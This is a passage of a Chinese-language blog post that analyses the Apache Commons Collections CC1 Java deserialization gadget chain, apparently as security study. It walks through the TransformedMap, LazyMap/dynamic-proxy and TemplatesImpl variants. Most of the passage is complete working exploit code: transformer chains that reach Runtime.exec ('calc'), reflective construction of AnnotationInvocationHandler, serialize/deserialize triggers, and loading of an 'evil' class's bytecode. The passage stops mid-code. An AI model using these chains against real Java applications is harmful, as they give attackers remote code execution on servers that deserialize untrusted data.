class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);<span class="comment">//这里模拟获取exec方法，并进行命令执行</span></span><br></pre></td></tr></table></figure><p>但是这样要一个个嵌套创建参数太麻烦了，我们这里找到了一个Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106103853342.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.*forName*(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">Chainedtransformer</span>(transformers);</span><br><span class="line">chainedtransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>第一个问题-Runtime类不能序列化-成功解决，但依然没有弹出计算器。</p><p>不只一个问题。</p><h3 id="二、绕过AnnotationInvocationHandler类readObject方法中的判断条件"><a href="#二、绕过AnnotationInvocationHandler类readObject方法中的判断条件" class="headerlink" title="二、绕过AnnotationInvocationHandler类readObject方法中的判断条件"></a><strong>二、绕过AnnotationInvocationHandler类readObject方法中的判断条件</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106104748114.png" class="" title="This is an example image"><p>这里存在两处判断需要绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (memberType != null) &#123;</span><br><span class="line">if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123;</span><br></pre></td></tr></table></figure><p>首先看第一个判断语句，是对memberType进行判断的。跟踪memberType，是从memberTypes来的，memberTypesu又是从annotationType.memberTypes();来的，而annotationType又是从annotationType &#x3D; AnnotationType.getInstance(type);来的。</p><p>那么其实就是从type来的。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106124951805.png" class="" title="This is an example image"><p>type其实是从构造器传参来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再回头看我们对构造器的传参，发现type对应Override.class，这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object o=constructor.newInstance(Override.class,transformedmap);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106125501951.png" class="" title="This is an example image"><p>而我们发现另一个注解:Target中有个名为value的成员变量，所以我们就可以使用这个注解,并改第一个键值对的值为value即可通过两个判断。</p><p>但是依然不能弹计算器。</p><h3 id="三、checkSetValue传入值不是Runtime-class"><a href="#三、checkSetValue传入值不是Runtime-class" class="headerlink" title="三、checkSetValue传入值不是Runtime.class"></a><strong>三、checkSetValue传入值不是Runtime.class</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106130111612.png" class="" title="This is an example image"><p>我们可以发现readObject方法中setValue传入的参数并不是Runtime.class，而是一个奇奇怪怪的东西。</p><ul><li>我们这里找到了一个能够解决 <code>setValue</code> 可控参数的类 ———— <code>ConstantTransformer</code>。</li></ul><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106154143060.png" class="" title="This is an example image"><p>我们看到这个类里面也有transform，和构造器配合使用的话，我们传入什么值，就会返回某个值，这样就能将value的值转为<strong>Runtime.class</strong></p><p>因此接下来给出我们的最终EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//这里解决问题三</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedtransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106164613205.png" class="" title="This is an example image"><p>成功弹出计算器。</p><p>接下来叙述一下整条cc1链的流程</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106170506128.png" class="" title="This is an example image"><h1 id="正版CC1链分析-lazyMap"><a href="#正版CC1链分析-lazyMap" class="headerlink" title="正版CC1链分析-lazyMap"></a>正版CC1链分析-lazyMap</h1><h2 id="终点-利用点-exec方法"><a href="#终点-利用点-exec方法" class="headerlink" title="终点-利用点-exec方法"></a>终点-利用点-exec方法</h2><p>漏洞点与上面一样，还是InvokerTransformer</p><p>在InvokerTransformer#transform下寻找用法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110195928983.png" class="" title="This is an example image"><p>LazyMap的get方法调用了transform方法且get方法的作用域为public</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200016287.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factory.transform</span><br></pre></td></tr></table></figure><p>那么我们看看factory是什么</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200355043.png" class="" title="This is an example image"><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200409626.png" class="" title="This is an example image"><p>可以知道factory是LazyMap构造器的参数，同时我们可以通过decorate来new一个LazyMap对象，factory是可以由我们自己决定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1_lazymap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime runtime=Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decoratemap=LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        Class&lt;LazyMap&gt; lazymapclass=LazyMap.class;</span><br><span class="line">        Method lazygetmethod=lazymapclass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>,Object.class);</span><br><span class="line">        lazygetmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        lazygetmethod.invoke(decoratemap,runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205053416.png" class="" title="This is an example image"><ul><li>目前证明这条链是可行的，我们继续往上走，最终目标是找到入口类的 <code>readObject</code> 方法。</li></ul><p>然后我们的目标就是找谁调用了get方法</p><p>最终在 <code>AnnotationInvocationHandler.invoke()</code> 方法中找到了有一个地方调用了 <code>get()</code> 方法。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205729222.png" class="" title="This is an example image"><p>这里其实可以类比成让memberValues为LazyMap即可。</p><p>同时这个类也非常好，它里面有 <code>readObject()</code> 方法，可以作为我们的入口类。</p><p>那么接下来我们要关注的就是如何触发invoke()方法</p><p>需要触发 <code>invoke</code> 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法。我们去找一找能利用的地方</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210202367.png" class="" title="This is an example image"><p>在这里调用了 <code>entrySet()</code> 方法，也就是说，如果我们将 <code>memberValues</code> 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 <code>invoke()</code> 方法，最终完成整条链子的调用。membervalues是构造器需要传入的参数。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210307500.png" class="" title="This is an example image"><p>那么这里就是要先让membervalues为lazymap再设置动态代理。</p><p>exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazymap_zong</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt;hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decorateMap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler annotationinvocationhandler=(InvocationHandler) constructor.newInstance(Override.class,decorateMap);</span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationinvocationhandler);</span><br><span class="line">        annotationinvocationhandler=(InvocationHandler)constructor.newInstance(Override.class,proxymap);</span><br><span class="line">        serialize(annotationinvocationhandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(name)));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110214009583.png" class="" title="This is an example image"><h2 id="链子整理"><a href="#链子整理" class="headerlink" title="链子整理"></a>链子整理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">调用链</span><br><span class="line">Invokertransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">Annotationinvocationhandler#readObject</span><br><span class="line"></span><br><span class="line">辅助链</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>这里直接借用别人的流程图吧</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/CC1LazyMap.png" alt="img"></p><h1 id="CC1-链的-TemplatesImpl-的实现方式"><a href="#CC1-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC1 链的 TemplatesImpl 的实现方式"></a>CC1 链的 TemplatesImpl 的实现方式</h1><p>cc3中得到的思路</p><blockquote><p>TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。</p></blockquote><ul><li>如图，链子不变，只是最后的命令执行方式变了。</li></ul><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png" alt="img"></p><p>所以这里我们先尝试修改命令执行的方法，这时候的链子应该是从后往前的，也就是确定了命令执行的方式之后，将传参设置为动态加载的字节码。并且前面的链子不变。</p><p>暂时的 EXP 是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后一句，传入 <code>chainedTransformer.transform(1)</code> 是因为前面我们定义了 <code>new ConstantTransformer(templates)</code>，这个类是需要我们传参的，传入 1 即可。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130145213179.png" class="" title="This is an example image"><ul><li>OK，弹计算器成功，接下来是把 CC1 链的前半部分拿进去。</li></ul><p>完整的 EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 